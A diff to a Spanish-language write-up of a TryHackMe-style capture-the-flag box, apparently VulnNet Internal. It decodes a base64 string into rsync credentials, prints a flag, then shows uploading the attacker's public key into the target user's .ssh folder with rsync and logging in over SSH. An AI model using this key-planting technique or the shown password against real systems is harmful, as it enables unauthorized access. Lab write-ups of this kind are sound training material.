@@ -57,9 +57,25 @@ Nada interesante
 Obtenemos este codigo que parece ser un code64:
 > QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==
 
+Decodificado dice los siguiente:
+> Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
+
+
 ### internal flag
 Obtenemos el segundo flag
 THM{ff8e518addbbddb74531a724236a8221}
+
+## RSYNC
+Podemos copiar nuestra clave publica en el .ssh de la maquina target:
+> rsync authorized_keys rsync-connect@vulnnet.thm::files/sys-internal/.ssh
+Password: Hcg3HP67@TW@Bc72v
+
+y despues logearnos en ssh con nuestra clave privada
+
+──(kali㉿kali)-[~/boxes/vul-int]
+└─$ ssh -i id_rsa sys-internal@vulnnet.thm 
+y ya estamos en la maquina target con el usuario **sys-internal**
+
 
 
 
